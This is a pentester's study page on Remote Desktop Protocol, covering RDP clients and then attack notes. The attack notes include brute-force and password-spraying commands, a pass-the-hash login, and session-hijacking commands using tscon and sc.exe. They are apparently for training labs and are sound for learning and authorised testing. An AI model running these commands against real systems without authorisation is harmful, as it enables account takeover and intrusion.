# Remote Desktop Protocol (RDP)

[![windowsfundamentals](../../../cybersecurity/_badges/htb/windowsfundamentals.svg)](https://academy.hackthebox.com/course/preview/windows-fundamentals)
[![footprinting](../../../cybersecurity/_badges/htb/footprinting.svg)](https://academy.hackthebox.com/course/preview/footprinting)

<div class="row row-cols-lg-2"><div>

Remote Desktop Protocol (RDP) is a protocol used to access a  desktop with a graphical interface from another computer over a network connection.

🐊️ **Port**: 3389 <small>(TCP or rarely UDP)</small>

On Windows, there is the built-in Windows RDP Client: `mstsc.exe`.

There is [rdesktop](https://github.com/rdesktop/rdesktop) (1.1k ⭐). It supports [file transfer](/cybersecurity/red-team/_knowledge/topics/file_transfer.md).

There is [FreeRDP](https://github.com/FreeRDP/FreeRDP) (7.5k ⭐), and there is a graphical version too [xfreerdp-gui](https://github.com/wyllianbs/xfreerdp-gui) (29 ⭐). It supports [file transfer](/cybersecurity/red-team/_knowledge/topics/file_transfer.md).

```shell!
$ xfreerdp /u:username /p:password /v:IP
$ xfreerdp /u:username /pth:hash /v:IP
$ xfreerdp /dynamic-resolution +clipboard /timeout:50000 /cert:ignore /v:IP /u:x /p:y
```
</div><div>

There is [Remmina](https://github.com/FreeRDP/Remmina) <small>(2.1k ⭐, `apt install remmina`)</small> which has an easy-to-use graphical interface.

* `remmina`: start the graphical interface
  * Enter the IP of the target
  * Enter the credentials
  * Connect
* Then, I would advise toggling "dynamic resolution update" in the left menu, so that you have a bigger screen.
* In preferences, we are able to select a keyboard mapping
* [You can scale the screen too](https://askubuntu.com/questions/1075098/remmina-scaling-options)

**Note ⚠️**: In preferences, quality settings, you can select to use poor quality with wallpaper to increase performance.
</div></div>

<hr class="sep-both">

## RDP Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

#### Enumeration

[![attacking_common_services](../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
[![passwordattacks](../../../cybersecurity/_badges/thmp/passwordattacks.svg)](https://tryhackme.com/room/passwordattacks)

* Using [nmap](/cybersecurity/red-team/tools/scanners/ports/nmap.md) to run scripts

```ps
$ # nmap RDP cookies are leaving traces (--packet-trace)
$ sudo nmap -sV -sC -p 3389 --script rdp* IP
```

#### Foothold

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![attacking_common_services](../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
[![passwordattacks](../../../cybersecurity/_badges/thmp/passwordattacks.svg)](https://tryhackme.com/room/passwordattacks)

* The password may be weak and vulnerable to [brute force](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md).

```shell!
$ hydra -L user.list -P password.list rdp://IP -V
$ crowbar -b rdp -s IP/32 -u username -C password.list -v -n 64
```

There is also [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) <small>(0.6k ⭐)</small>.

```ps
$ python3 RDPassSpray.py -u username -p password -t IP:port
$ python3 RDPassSpray.py -U usernames.lst -p password -t IP:port
$ python3 RDPassSpray.py [...] -d domain
$ python3 RDPassSpray.py [...] -T rdp_servers.lst
```
</div><div>

#### Exploitation

[![attacking_common_services](../../../cybersecurity/_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)

* **RDP Session Hijacking**: connect to another user session. On Windows, as admin, we can use [tscon](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon).

```ps
PS> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

On Windows Server prior to 2019 as a local administrator, we can use:

```ps
PS> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
PS> net start sessionhijack
```

#### Well-known CVEs

* [BlueKeep Vulnerability](https://en.wikipedia.org/wiki/BlueKeep) <small>(2019, RCE, unstable/BSoD)</small>

#### Additional Tools

* [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) <small>(0.2k ⭐, 2021 🪦)</small>
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* ms-wbt-server (Windows RDP implementation)
* [Network Level Authentication (NLA)](https://en.wikipedia.org/wiki/Remote_Desktop_Services#Network_Level_Authentication)
</div><div>
</div></div>